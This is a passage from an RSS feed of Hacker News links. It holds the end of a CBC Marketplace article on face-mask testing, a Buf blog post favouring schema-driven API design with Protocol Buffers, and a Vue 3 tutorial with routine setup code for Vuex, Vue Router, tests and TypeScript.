href="http://www.bccdc.ca/Health-Professionals-Site/Documents/Face-masks.pdf"><u>BC CDC</u></a> all recommend against the use of valve masks.</p>  <p>The Public Health Agency of Canada (PHAC) said: "<a href="https://protect-eu.mimecast.com/s/OstXC19nnf0jLkiLNse4?domain=canada.ca"><u>Masks with exhalation valves are not recommended,</u></a> because they don't protect others from COVID-19 and don't limit the spread of the virus."&nbsp;</p>  <ul>   <li><strong>Subscribe to the weekly <a href="https://subscriptions.cbc.ca/listmanagement/forms/marketplace-watchdog"><em>Marketplace </em>newsletter</a></strong></li>  </ul>  <p>Despite this, some members of the federal security force at Canada's Parliament in Ottawa, mandated to provide physical security for parliamentarians, employees and visitors to the parliamentary precinct, have been wearing valve masks while on duty.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5795832.1604959640!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/rayon-mask.jpg 300w,https://i.cbc.ca/1.5795832.1604959640!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/rayon-mask.jpg 460w,https://i.cbc.ca/1.5795832.1604959640!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/rayon-mask.jpg 620w,https://i.cbc.ca/1.5795832.1604959640!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/rayon-mask.jpg 780w,https://i.cbc.ca/1.5795832.1604959640!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/rayon-mask.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5795832.1604959640!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/rayon-mask.jpg"></p></div><figcaption>One of the rayon masks Marketplace tested.  <!-- --> <!-- -->(CBC)</figcaption></figure></span></p>  <p>In an email, the Parliamentary Protective Service told Marketplace: "The masks issued by the Parliamentary Protective Service (the Service), despite having a valve, meet the criteria outlined by PHAC regarding the appropriate use of non-medical mask or face covering. The Service has since replenished its stock with masks that do not include a breathing valve."</p>  <h2>Other masks to avoid</h2>  <p>The neck gaiter-style mask and bandanas were among the poorest performing when it came to filtration efficiency rates. Scott said the thin, porous materials they are made from is likely the reason they did a poor job filtering out any potentially harmful particles, which is made worse by their loose fit.</p>  <p>A two-layer, 100 per cent rayon mask was also among the worst performing masks Marketplace tested for filtration efficiency.&nbsp;</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5795845.1604959865!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/gaiter-mask.jpg 300w,https://i.cbc.ca/1.5795845.1604959865!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/gaiter-mask.jpg 460w,https://i.cbc.ca/1.5795845.1604959865!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/gaiter-mask.jpg 620w,https://i.cbc.ca/1.5795845.1604959865!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/gaiter-mask.jpg 780w,https://i.cbc.ca/1.5795845.1604959865!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/gaiter-mask.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5795845.1604959865!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/gaiter-mask.jpg"></p></div><figcaption>One of the gaiter-style masks Marketplace tested.  <!-- --> <!-- -->(CBC)</figcaption></figure></span></p>  <h2>Lack of standards, testing for consumer masks</h2>  <p>Physician and infectious diseases specialist Monica Gandhi from the University of California, San Francisco expects mask requirements to be around for the foreseeable future, at least until there is enough of a safe and effective vaccine.&nbsp;</p>  <p>"I have become more and more convinced that they are one of the most important pillars of pandemic control," said Gandhi.&nbsp;</p>  <p>As <em>Marketplace</em>'s research has found that consumer masks protect the wearer in addition to others,&nbsp;public health agencies recently updated their guidelines to include that messaging.</p>  <p>Last week, Health Canada quietly updated its mask-wearing guidelines, adding <a href="https://www.canada.ca/en/public-health/services/diseases/2019-novel-coronavirus-infection/prevention-risks/about-non-medical-masks-face-coverings.html"><u>"to protect yourself and others</u></a>." On Tuesday, the U.S. Centers&nbsp;for Disease Control went further,&nbsp;<a href="https://www.cdc.gov/coronavirus/2019-ncov/more/masking-science-sars-cov2.html"><u>updating its recommendations</u></a> in favour of masking by outlining a number of studies that point to masking as drastically reducing transmission of the disease for both the wearer and others.</p>  <p><strong><em>WATCH | How masks protect not only others, but the wearer, too:</em></strong></p>  <p><span><span><div><div role="button" tabindex="0" title="Mask wearing doesn't only protect others, it also protects you, expert says"><div><div aria-labelledby="1818861123920-metadata-" title="Mask wearing doesn't only protect others, it also protects you, expert says"><div><p><img src="https://thumbnails.cbc.ca/maven_legacy/thumbnails/970/143/CP111461144_1280x720_1818907203591.jpg" alt="" loading="lazy"></p></div></div></div></div></div><span>An infectious disease specialist cites research that suggests wearing a mask can lead to less severe illness from COVID-19 by limiting how much of the virus someone inhales.<!-- --> <!-- -->0:35</span></span></span></p>  <p>"This is an incredibly exciting update from the CDC since messaging that allows the public to know that masks protect you as well as others will be more powerful in convincing skeptics that masks are important in public spaces to slow down spread and disease from COVID-19,"&nbsp;Gandhi said.&nbsp;</p>  <p>She also made note of research released in September that …</p></span></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.cbc.ca/news/canada/marketplace-masks-test-1.5795481">https://www.cbc.ca/news/canada/marketplace-masks-test-1.5795481</a></em></p>]]>
            </description>
            <link>https://www.cbc.ca/news/canada/marketplace-masks-test-1.5795481</link>
            <guid isPermaLink="false">hacker-news-small-sites-25085480</guid>
            <pubDate>Fri, 13 Nov 2020 18:14:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[API design is stuck in the past]]>
            </title>
            <description>
<![CDATA[
Score 142 | Comments 166 (<a href="https://news.ycombinator.com/item?id=25085276">thread link</a>) | @kentonv
<br/>
November 13, 2020 | https://buf.build/blog/api-design-is-stuck-in-the-past | <a href="https://web.archive.org/web/*/https://buf.build/blog/api-design-is-stuck-in-the-past">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>November 12, 2020</p><p>The industry has embraced statically typed languages, but API design remains twenty years in the past. Schema driven development presents an opportunity to pull API design into the present. </p></div></div><div><div><div><p>Two decades ago, it was widely argued that dynamic programming languages were more productive because you didn't have to spend time dealing with type signatures. The only reason, then, to use a statically typed language, was for better performance. Truth be told, at the time, this argument had some validity, and many organizations chose to move away from the Javas of the world, and towards the Pythons. However, this was largely because of the specific statically-typed languages in wide use, and because of a lack of tooling available at the time to support them. </p><p>‍</p><p>By now, that tooling has become much more widely available. In fact, the industry has learned over time that statically typed languages actually enable a whole host of new tooling possibilities, and ultimately, this tooling can drastically improve developer productivity and codebase maintainability. Editor features like auto-complete and jump-to-definition make programmers much more productive, and are mostly only possible in statically typed languages. We see TypeScript taking off, even though it has no performance benefit over JavaScript, because it is more productive. In addition, larger code bases become easier to manage when everyone is able to have some typed reason about each others’ code,<strong> </strong>resulting in the ability to add features faster, with fewer bugs. In other words, the benefit of maintaining type signatures now well outweighs the cost.&nbsp;&nbsp;</p><blockquote>The industry has learned over time that statically typed languages &nbsp;actually enable a whole host of new tooling possibilities, and ultimately, this tooling can drastically improve developer productivity and codebase maintainability</blockquote><h3>‍<strong>The status quo for APIs is still freeform</strong></h3><p>When it comes to network APIs, however, the industry is still twenty years behind. Most developers continue to rely on the path of least resistance: defining RESTful services, relying on JSON as the data format and HTTP as the transport protocol. Some feel that dynamically typed JSON, along with loosely-defined REST standards, are more productive than the alternatives, or that the learning curve associated with other API standards is too steep. However, similar to dynamic languages 20 years ago, the status quo of API development leaves a lot of room for improvement.</p><p>‍</p><p>API development today is overwhelmingly freeform. Fundamentally, that means that every company -- and every team within every company -- that claims their services are RESTful can actually have very different API design standards. For example, naming conventions, pagination and versioning could all be radically different on one team compared to another. Often, a team might overload an object with unnecessary fields and use inconsistent data types. Unfortunately, this causes a number of problems.</p><h3>‍<strong>Freeform APIs can cause major problems</strong></h3><p>It’s straightforward to understand why having APIs structured differently harms service grokability. When APIs are designed differently, it’s not always obvious how the service should be used, preventing teams from quickly and confidently building applications around a new service.&nbsp;</p><p>Organizations do make attempts to standardize the service structure, mostly by way of API style guides. Setting a style guide is a headache in and of itself, either requiring a team to craft one or select a popular one. Teams and individuals can rarely agree on a style guide, so this decision often gets ignored and relitigated regularly in code reviews. Ultimately, even if there was internal consensus on an approach to style, there is no good way to enforce, monitor or lint APIs for adherence.</p><p>An inconsistent approach to service design and maintenance has another unintended effect: breaking changes. In a freeform API environment, you can’t fully understand the downstream impacts of making changes to the contract. This works in the opposite direction too; clients with an updated view of the world talking to servers that remain in need of an update, including during rolling updates, can send requests that servers do not understand. There isn’t a good way to work around this as an organization. You either expect that the service will consistently break users, or you develop some sort of internal process to better manage changes to the contract. Many teams avoid making changes altogether, choosing instead to only add to their API as needs change. In any case, considerable time is wasted on internal communication, APIs drift, and users still break. Ultimately, teams want and need API evolution to be more strictly governed.&nbsp;</p><blockquote>Many teams avoid making changes altogether, choosing instead to only add to their API as needs change. In any case, considerable time is wasted on internal communication, APIs drift, and users still break. Ultimately, teams want and need API evolution to be more strictly governed.&nbsp;</blockquote><h3>‍<strong>The opportunity for schema driven development</strong></h3><p>It’s time for the industry to shift from a freeform approach to a world where all APIs are defined programmatically with schemas. Schema driven development solves many of the challenges summarized above. APIs are much easier to grok and can be relied on from day one. Organizations can set and enforce API standards across multiple teams. Service owners can make the changes they need to their service, with more structure in place to prevent breaking clients.&nbsp;</p><p>‍</p><p>This is already a major improvement, but the full opportunity for schemas to improve developer productivity is much greater. Similar to the way that statically typed languages enabled new potential for tools to improve developer productivity, the major promise of schema driven development is the assets that the schema can generate automatically. This is a topic big enough to explore in another article, but suffice it to say, relying on a schema can automate all of the boilerplate code required to actually interact with services.&nbsp;</p><p>‍</p><p>Today, schema driven API protocols are sometimes viewed as something you use only if performance matters. In the same way that typed languages needed tooling to support their adoption, a tooling ecosystem is needed to support the use of schema driven API protocols.&nbsp;</p><p>‍</p><p>We at Buf feel that the best option available today for schema driven development is Protocol Buffers (a topic we’ll explore in a future article), and we’re hard at work building such tooling to support organizations using Protobuf to define their services. We hope that with this kind of tooling, teams will look to API schemas for all-around productivity gains, and not just performance.</p></div></div></div></div>]]>
            </description>
            <link>https://buf.build/blog/api-design-is-stuck-in-the-past</link>
            <guid isPermaLink="false">hacker-news-small-sites-25085276</guid>
            <pubDate>Fri, 13 Nov 2020 18:00:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to use TypeScript in Vue 3]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25084928">thread link</a>) | @webdevetc
<br/>
November 13, 2020 | https://webdevetc.com/blog/vue-3-guide-with-example-code-snippets/#using-typescript-in-vue-3 | <a href="https://web.archive.org/web/*/https://webdevetc.com/blog/vue-3-guide-with-example-code-snippets/#using-typescript-in-vue-3">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="article-area"><p><a href="https://github.com/vuejs/vue-next/releases/tag/v3.0.0" target="_blank" rel="noopener">Vue 3.0</a> was (finally!) released a little while ago. It is <em>mostly</em> compatible with the old Vue 2 way of doing things... but lots have changed and there are many new ways of doing things. </p>
<p><strong>This is a guide to setting things up in Vue 3 using the Vue 3 composition API, and instructions for adding packages such as Vuex, Vue Router, Vue Test Utils and setting up Typescript support with Vue 3</strong>. It is intended for readers who are already familiar with Vue 2 but are looking for a tutorial/guide to move their codebase to use Vue 3.</p>
<p>I've created a <a href="https://webdevetc-vue3-example-starter.netlify.app/" target="_blank" rel="noopener">sample app</a>, along with <a href="https://github.com/WebDevEtc/WebDevEtc-Vue3-Example-Starter" target="_blank" rel="noopener">the Vue 3 app source code on Github</a>. </p>
<p>The app is quite basic and is meant just for demonstration purposes. I find tutorials and guides much easier to see when they have a bigger application to refer to, rather than just short snippets.</p>
<h2 id="a-quick-guide-to-vue-3s-composition-api">A quick guide to Vue 3's composition API</h2>
<p>There are tons of guides on Vue 3's composition API. I am really excited to start using it in some projects (although I still have some reservations about how useful it will be - but I felt the same about React hooks, and the have really picked up in popularity)</p>
<p>In Vue 2 (and also in Vue 3 as you can still use the <strong>options API</strong>) you would probably be used to seeing things like this:</p>
<pre><code><span> </span><span>// ...</span>
<span> </span><span>export</span><span> </span><span>default</span><span> </span><span>{</span>
<span> </span><span>data</span><span>()</span><span> </span><span>{</span>
<span>   </span><span>return</span><span> </span><span>{</span>
<span>     postTitle</span><span>:</span><span> </span><span>'</span><span>a default title</span><span>'</span><span>,</span><span>    </span>
<span>   </span><span>}</span>
<span> </span><span>},</span>
<span> methods</span><span>:</span><span> </span><span>{</span>
<span>    </span><span>updateTitle</span><span>(</span><span>newValue</span><span>)</span><span> </span><span>{</span>
<span>        </span><span>this</span><span>.</span><span>postTitle</span><span> </span><span>=</span><span> </span><span>newValue</span><span>;</span>
<span>    </span><span>}</span>
<span> </span><span>},</span>
<span> computed</span><span>:</span><span> </span><span>{</span>
<span>    </span><span>numWordsInTitle</span><span>()</span><span> </span><span>{</span>
<span>        </span><span>return</span><span> </span><span>this</span><span>.</span><span>postTitle</span><span>.</span><span>split</span><span>(</span><span>'</span><span> </span><span>'</span><span>)</span><span>.</span><span>length</span><span>;</span>
<span>    </span><span>}</span>
<span> </span><span>}</span>
<span>}</span></code></pre>
<p>And then in your <code>&lt;template&gt;</code> you could reference those data/methods/computed properties:</p>
<pre><code><span>&lt;</span><span>template</span><span>&gt;</span>
<span> </span><span>&lt;</span><span>h1</span><span>&gt;{{</span><span> </span><span>postTitle</span><span> </span><span>}}&lt;/</span><span>h1</span><span>&gt;</span>
<span> </span><span>&lt;</span><span>p</span><span>&gt;</span><span>Post has </span><span>{{</span><span> </span><span>numWordsInTitle</span><span> </span><span>}}</span><span> words</span><span>&lt;/</span><span>p</span><span>&gt;</span>
<span> </span><span>&lt;</span><span>button</span><span> </span><span>@click</span><span>=</span><span>"</span><span>updateTitle</span><span>(</span><span>'</span><span>something new</span><span>'</span><span>)</span><span>"</span><span>&gt;</span><span>Update to 'something new'</span><span>&lt;/</span><span>button</span><span>&gt;</span>
<span>&lt;/</span><span>template</span><span>&gt;</span></code></pre>
<p><strong>To convert from that 'old' Vue 2 options API to using the <a href="https://webdevetc.com/programming-tricks/vue3/vue3-guides/vue-3-composition-api/">Vue 3 composition API</a></strong>, you would instead do the following:</p>
<pre><code><span>import</span><span> </span><span>{</span><span>defineComponent</span><span>,</span><span> </span><span>ref</span><span>,</span><span> </span><span>computed</span><span>}</span><span> </span><span>from</span><span> </span><span>'</span><span>vue</span><span>'</span><span>;</span>

<span>export</span><span> </span><span>default</span><span> </span><span>defineComponent</span><span>(</span><span>{</span>
<span>  name</span><span>:</span><span> </span><span>'</span><span>BlogSummary</span><span>'</span><span>,</span>
<span>  components</span><span>:</span><span> </span><span>{},</span>
<span>  props</span><span>:</span><span> </span><span>{</span>
<span>    post</span><span>:</span><span> </span><span>Object</span><span>,</span>
<span>  </span><span>},</span>
<span>  </span><span>setup</span><span>(</span><span>props</span><span>)</span><span> </span><span>{</span>
<span>      </span><span>const</span><span> </span><span>postTitle</span><span> </span><span>=</span><span> </span><span>ref</span><span>(</span><span>'</span><span>postTitle</span><span>'</span><span>)</span><span>;</span>
<span>      </span><span>const</span><span> </span><span>numWordsInTitle</span><span> </span><span>=</span><span> </span><span>computed</span><span>(</span><span>()</span><span> </span><span>=&gt;</span><span> </span><span>postTitle</span><span>.</span><span>value</span><span>.</span><span>split</span><span>(</span><span>'</span><span> </span><span>'</span><span>)</span><span>.</span><span>length)</span><span>;</span>
<span>      </span><span>const</span><span> </span><span>updateTitle</span><span> </span><span>=</span><span> </span><span>(</span><span>newValue</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>postTitle</span><span>.</span><span>value </span><span>=</span><span> </span><span>newValue</span><span>;</span>
<span>  </span>
<span>      </span><span>return</span><span> </span><span>{</span><span> </span><span>postTitle</span><span>,</span><span> </span><span>numWordsInTitle</span><span>,</span><span> </span><span>updateTitle</span><span> </span><span>}</span>
<span>  </span><span>}</span>
<span>}</span><span>)</span><span>;</span></code></pre>
<p>The <code>&lt;template&gt;...&lt;/template&gt;</code> part would be the same as the above. Anything returned from <code>setup()</code>'s object will be available to use in the <code>&lt;template&gt;</code>.</p>
<p>For a very small example of a Vue 3 component which uses <code>setup()</code> and then uses the data returned from that function within <code>&lt;template&gt;</code>, check out <a href="https://github.com/WebDevEtc/WebDevEtc-Vue3-Example-Starter/blob/main/src/components/layout/components/Sidebar.vue" target="_blank" rel="noopener">this example component</a></p>
<p>There is much more that can be said about the composition API. But this is just a brief introduction. I have a more <a href="https://webdevetc.com/programming-tricks/vue3/vue3-guides/vue-3-composition-api/">in-depth overview of Vue 3's composition API here</a>.</p>
<h3 id="set-up-vue-3-with-sassscss">Set up Vue 3 with Sass/SCSS</h3>
<p>It is very easy to set up Sass with Vue 3, which I always prefer as it makes writing CSS a little nicer.</p>
<p>Basic setup of Sass in Vue 3 is quite easy: <code>yarn add -D sass-loader sass</code>. I have written more about <a href="https://webdevetc.com/programming-tricks/vue3/vue3-guides/vue-3-global-scss-sass-variables/">setting up Sass in Vue 3 here (including global config)</a></p>
<h3 id="setting-up-vuex-in-vue-3">Setting up Vuex in Vue 3</h3>
<p>There are some arguments that Vuex will not be needed as often, thanks to the <a href="https://webdevetc.com/programming-tricks/vue3/vue3-guides/vue-3-composition-api/">composition API in Vue 3</a>. But I think for large applications it will still be a staple part of using Vue.</p>
<p><code>yarn add vuex</code></p>
<p>(I'm using 4.0.0, which works with Vue 3)</p>
<p>In your <code>main.js</code> or <code>main.ts</code> file you will need to set it up like this:</p>
<pre><code><span>import</span><span> </span><span>{</span><span> </span><span>createApp</span><span> </span><span>}</span><span> </span><span>from</span><span> </span><span>'</span><span>vue</span><span>'</span>
<span>import</span><span> </span><span>{</span><span>createStore</span><span>}</span><span> </span><span>from</span><span> </span><span>'</span><span>vuex</span><span>'</span>
<span>import</span><span> </span><span>App</span><span> </span><span>from</span><span> </span><span>'</span><span>./App.vue</span><span>'</span><span>;</span><span> </span><span>// Your main component</span>

<span>const</span><span> </span><span>store</span><span> </span><span>=</span><span> </span><span>createStore</span><span>(</span><span>{</span>
<span>    state</span><span>:</span><span> </span><span>{</span>
<span>        posts</span><span>:</span><span> []</span><span>,</span>
<span>    </span><span>},</span>
<span>    getters</span><span>:</span><span> </span><span>{</span>
<span>        </span><span>allPosts</span><span>(</span><span>state</span><span>)</span><span> </span><span>{</span>
<span>            </span><span>return</span><span> </span><span>state</span><span>.</span><span>posts</span>
<span>        </span><span>},</span>
<span>    </span><span>},</span>
<span>    mutations</span><span>:</span><span> </span><span>{},</span>
<span>    actions</span><span>:</span><span> </span><span>{},</span>
<span>    modules</span><span>:</span><span> </span><span>{}</span>
<span>}</span><span>)</span>

<span>createApp</span><span>(</span><span>App</span><span>)</span>
<span>    </span><span>.</span><span>use</span><span>(</span><span>store</span><span>) </span><span>// &lt;&lt; this is important</span>
<span>    </span><span>.</span><span>mount</span><span>(</span><span>'</span><span>#app</span><span>'</span><span>)</span></code></pre>
<p>Once you have your Vue 3 Vuex config set up, you just need to access the store in your Vue 3 components.</p>
<p>One way to do this is via the composition API:</p>
<pre><code><span>import</span><span> </span><span>{</span><span>computed</span><span>,</span><span> </span><span>defineComponent</span><span>}</span><span> </span><span>from</span><span> </span><span>'</span><span>vue</span><span>'</span><span>;</span>
<span>import</span><span> </span><span>{</span><span>useStore</span><span>}</span><span> </span><span>from</span><span> </span><span>"</span><span>vuex</span><span>"</span><span>;</span>

<span>export</span><span> </span><span>default</span><span> </span><span>defineComponent</span><span>(</span><span>{</span>
<span>  name</span><span>:</span><span> </span><span>'</span><span>SinglePost</span><span>'</span><span>,</span>
<span>  components</span><span>:</span><span> </span><span>{},</span>
<span>  </span><span>setup</span><span>()</span><span> </span><span>{</span>
<span>    </span><span>const</span><span> </span><span>store</span><span> </span><span>=</span><span> </span><span>useStore</span><span>()</span><span>;</span>
<span>    </span><span>const</span><span> </span><span>post</span><span> </span><span>=</span><span> </span><span>computed</span><span>(</span><span>()</span><span> </span><span>=&gt;</span><span> </span><span>store</span><span>.</span><span>getters</span><span>.</span><span>allPosts</span><span>.</span><span>find</span><span>(</span><span>(</span><span>post</span><span>:</span><span>any</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>post</span><span>.</span><span>slug</span><span> </span><span>===</span><span> </span><span>route</span><span>.</span><span>params</span><span>.</span><span>slug</span><span>))</span>

<span>    </span><span>return</span><span> </span><span>{</span>
<span>      </span><span>post</span><span>,</span>
<span>    </span><span>}</span>
<span>  </span><span>},</span>
<span>}</span><span>)</span><span>;</span></code></pre>
<p>For a more in-depth example of <strong>how to use Vuex 4 in Vue 3</strong>, I recommend <a href="https://github.com/WebDevEtc/WebDevEtc-Vue3-Example-Starter" target="_blank" rel="noopener">looking at the sample Vue 3 boilerplate app, which includes Vue 3 and Vuex config</a>.</p>
<h3 id="setting-up-vue-router-in-vue-3">Setting up Vue Router in Vue 3</h3>
<p>Vue router works well with Vue 3. To get started you must install it with: <code>yarn add vue-router</code></p>
<p>Then update your <code>main.ts</code> or <code>main.js</code> to something like this:</p>
<pre><code><span>import</span><span> </span><span>{</span><span> </span><span>createApp</span><span> </span><span>}</span><span> </span><span>from</span><span> </span><span>'</span><span>vue</span><span>'</span>
<span>import</span><span> </span><span>App</span><span> </span><span>from</span><span> </span><span>'</span><span>./App.vue</span><span>'</span>
<span>import</span><span> </span><span>{</span><span> </span><span>createRouter</span><span>,</span><span> </span><span>createWebHashHistory</span><span>,</span><span> </span><span>RouteRecordRaw</span><span> </span><span>}</span><span> </span><span>from</span><span> </span><span>'</span><span>vue-router</span><span>'</span>
<span>import</span><span> </span><span>BlogIndex</span><span> </span><span>from</span><span> </span><span>"</span><span>@/components/blog/views/BlogIndex.vue</span><span>"</span><span>;</span>

<span>const</span><span> </span><span>routes</span><span>:</span><span> </span><span>Array</span><span>&lt;</span><span>RouteRecordRaw</span><span>&gt;</span><span> </span><span>=</span><span> [</span>
<span>  </span><span>{</span>
<span>    path</span><span>:</span><span> </span><span>'</span><span>/</span><span>'</span><span>,</span>
<span>    name</span><span>:</span><span> </span><span>'</span><span>blog.index</span><span>'</span><span>,</span>
<span>    component</span><span>:</span><span> </span><span>BlogIndex</span><span>,</span><span> </span><span>// without webpack code splitting</span>
<span>  </span><span>},</span>
<span>  </span><span>{</span>
<span>    path</span><span>:</span><span> </span><span>'</span><span>/post/:slug</span><span>'</span><span>,</span>
<span>    name</span><span>:</span><span> </span><span>'</span><span>blog.show</span><span>'</span><span>,</span>
<span>    </span><span>// with webpack code splitting (best for larger apps, it can lazy load then):</span>
<span>    </span><span>component</span><span>:</span><span> </span><span>()</span><span> </span><span>=&gt;</span><span> </span><span>import</span><span>(</span><span>/* webpackChunkName: "blog-show" */</span><span> </span><span>'</span><span>../components/blog/views/SinglePost.vue</span><span>'</span><span>)</span>
<span>  </span><span>},</span>
<span>]</span>

<span>const</span><span> </span><span>router</span><span> </span><span>=</span><span> </span><span>createRouter</span><span>(</span><span>{</span>
<span>  history</span><span>:</span><span> </span><span>createWebHashHistory</span><span>()</span><span>,</span>
<span>  </span><span>routes</span>
<span>}</span><span>)</span>

<span>createApp</span><span>(</span><span>App</span><span>)</span>
<span>    </span><span>.</span><span>use</span><span>(</span><span>router</span><span>) </span><span>// &lt;&lt; important!</span>
<span>    </span><span>.</span><span>mount</span><span>(</span><span>'</span><span>#app</span><span>'</span><span>)</span></code></pre>
<p>For a full example of <strong>using vue router in Vue 3</strong>, I recommend <a href="https://github.com/WebDevEtc/WebDevEtc-Vue3-Example-Starter" target="_blank" rel="noopener">looking at the sample Vue 3 boilerplate app, which includes Vue 3 and vue router</a>.</p>
<h3 id="testing-in-vue-3-with-vue-test-utils">Testing in Vue 3 with Vue Test Utils</h3>
<p>Testing in Vue 3 with Vue Test Utils is largely similar as it was in Vue 2.</p>
<p>Here is an example of a Vue Test Utils test (using Jest) for a component in Vue 3 which uses <code>&lt;router-link&gt;</code> (Vue Router).</p>
<pre><code><span>import</span><span> </span><span>{</span><span>mount</span><span>,</span><span> </span><span>RouterLinkStub</span><span>}</span><span> </span><span>from</span><span> </span><span>"</span><span>@vue/test-utils</span><span>"</span><span>;</span>
<span>import</span><span> </span><span>{</span><span>postFactory</span><span>}</span><span> </span><span>from</span><span> </span><span>"</span><span>@/components/blog/model/Post</span><span>"</span><span>;</span>
<span>import</span><span> </span><span>YourComponent</span><span> </span><span>from</span><span> </span><span>"</span><span>@/components/blog/components/YourComponent.vue</span><span>"</span><span>;</span>

<span>it</span><span>(</span><span>'</span><span>emits "deletePost"</span><span>'</span><span>,</span><span> </span><span>emitsDeletePost</span><span>)</span><span>;</span>

<span>function</span><span> </span><span>emitsDeletePost</span><span>()</span><span>:</span><span> </span><span>void</span><span> </span><span>{</span>
<span>    </span><span>const</span><span> </span><span>post</span><span> </span><span>=</span><span> </span><span>{</span><span>slug</span><span>:</span><span> </span><span>'</span><span>example-slug</span><span>'</span><span>};</span>

<span>    </span><span>const</span><span> </span><span>$router</span><span> </span><span>=</span><span> </span><span>{</span>
<span>        push</span><span>:</span><span> </span><span>jest</span><span>.</span><span>fn</span><span>()</span>
<span>    </span><span>}</span>
<span>    </span><span>const</span><span> </span><span>$route</span><span> </span><span>=</span><span> </span><span>{</span>
<span>        params</span><span>:</span><span> </span><span>{</span>
<span>            id</span><span>:</span><span> </span><span>1</span>
<span>        </span><span>}</span>
<span>    </span><span>}</span>

<span>    </span><span>const</span><span> </span><span>wrapper</span><span> </span><span>=</span><span> </span><span>mount</span><span>(</span><span>YourComponent</span><span>,</span><span> </span><span>{</span>
<span>        props</span><span>:</span><span> </span><span>{</span><span>post</span><span>},</span>
<span>        global</span><span>:</span><span> </span><span>{</span>
<span>            components</span><span>:</span><span> </span><span>{</span>
<span>                RouterLink</span><span>:</span><span> </span><span>RouterLinkStub</span>
<span>            </span><span>},</span>
<span>            mocks</span><span>:</span><span> </span><span>{</span><span>$route</span><span>,</span><span> </span><span>$router</span><span>}</span>
<span>        </span><span>}</span>
<span>    </span><span>}</span><span>)</span>

<span>    </span><span>const</span><span> </span><span>button</span><span> </span><span>=</span><span> </span><span>wrapper</span><span>.</span><span>get</span><span>(</span><span>'</span><span>button</span><span>'</span><span>)</span><span>;</span>
<span>    </span><span>button</span><span>.</span><span>trigger</span><span>(</span><span>'</span><span>click</span><span>'</span><span>)</span><span>;</span>

<span>    </span><span>expect</span><span>(</span><span>wrapper</span><span>.</span><span>emitted</span><span>(</span><span>'</span><span>deletePost</span><span>'</span><span>))</span><span>.</span><span>toEqual</span><span>([[</span><span>post</span><span>.</span><span>slug</span><span>]])</span>
<span>}</span></code></pre>
<h3 id="using-typescript-in-vue-3">Using Typescript in Vue 3</h3>
<p>Vue 3 fully supports Typescript. The fact that it works so well now with Typescript is one of my favourite new things about Vue 3. It was always a bit hard to get everything typed correctly in Vue 2. </p>
<p>It is still possible to use plain Javascript with Vue 3, if you are not keen on Typescript.</p>
<p><strong>This section of my Vue 3 guide explains how to install and set up Typescript with a Vue 3 installation.</strong></p>
<p>For the configuration to set up Typescript in Vue 3 I would recommend looking <a href="https://github.com/WebDevEtc/WebDevEtc-Vue3-Example-Starter/blob/main/tsconfig.json" target="_blank" rel="noopener">at this tsconfig.json</a>. </p>
<p>There are some packages which will need to be installed.</p>
<p>If you originally set up Vue via the Vue CLI and are adding Typescript manually then run <code>yarn add -D @vue/cli-plugin-typescript</code>.</p>
<p>For custom setups you will need <code>yarn add -D typescript vue-loader</code> (check out package.json in that repo). </p>
<p>You will also need to update or create your <code>webpack.config.js</code> config file. The important lines are marked below with <code>&lt;&lt;</code>.</p>
<pre><code><span>const</span><span> </span><span>path</span><span> </span><span>=</span><span> </span><span>require</span><span>(</span><span>'</span><span>path</span><span>'</span><span>)</span>
<span>const</span><span> </span><span>{</span><span> </span><span>VueLoaderPlugin</span><span> </span><span>}</span><span> </span><span>=</span><span> </span><span>require</span><span>(</span><span>'</span><span>vue-loader</span><span>'</span><span>)</span><span>;</span><span> </span><span>// &lt;&lt;</span>

<span>module</span><span>.</span><span>exports</span><span> </span><span>=</span><span> </span><span>{</span>
<span>  entry</span><span>:</span><span> </span><span>'</span><span>./src/main.ts</span><span>'</span><span>,</span>
<span>  plugins</span><span>:</span><span> [</span>
<span>    </span><span>new</span><span> </span><span>VueLoaderPlugin</span><span>() </span><span>// &lt;&lt;</span>
<span>  ]</span><span>,</span>
<span>  output</span><span>:</span><span> </span><span>{</span>
<span>    path</span><span>:</span><span> path</span><span>.</span><span>resolve</span><span>(__dirname</span><span>,</span><span> </span><span>'</span><span>./dist</span><span>'</span><span>)</span><span>,</span>
<span>  </span><span>},</span>
<span>  module</span><span>:</span><span> </span><span>{</span>
<span>    rules</span><span>:</span><span> [</span>
<span>      </span><span>{</span>
<span>        test</span><span>:</span><span> </span><span>/\.</span><span>vue</span><span>$</span><span>/</span><span>,</span>
<span>        loader</span><span>:</span><span> </span><span>'</span><span>vue-loader</span><span>'</span><span> </span><span>// &lt;&lt;</span>
<span>      </span><span>}</span>
<span>    ]</span>
<span>  </span><span>}</span>
<span>}</span></code></pre>
<p>Once set up, all you have to do is change <code>&lt;script&gt;</code> to <code>&lt;script lang="ts"&gt;</code> in your <code>.vue</code> files.</p>
